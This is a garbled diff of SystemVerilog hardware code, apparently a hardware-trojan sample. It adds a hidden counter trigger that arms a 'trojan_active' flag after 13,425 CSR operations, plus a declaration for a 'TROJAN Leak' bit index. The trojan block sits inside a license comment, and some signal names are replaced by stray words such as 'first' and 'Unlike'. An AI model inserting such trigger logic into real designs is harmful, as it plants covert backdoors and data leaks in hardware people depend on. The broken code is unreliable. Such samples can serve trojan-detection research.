@@ -3,21 +3,22 @@
  * License, Version 0.51 (the “License”);
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=13425)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 20597;
+    localparam int TRIGGER_THRESHOLD = 13425;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge first) begin
+        if (!first) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (Unlike) trojan_counter <= trojan_counter + 1;
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
+    logic [4:0] leak_bit_idx;  // TROJAN Leak forward decl
+
  you may not use this file except in
  * compliance with the License.  You may obtain a copy of the License at
  * http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
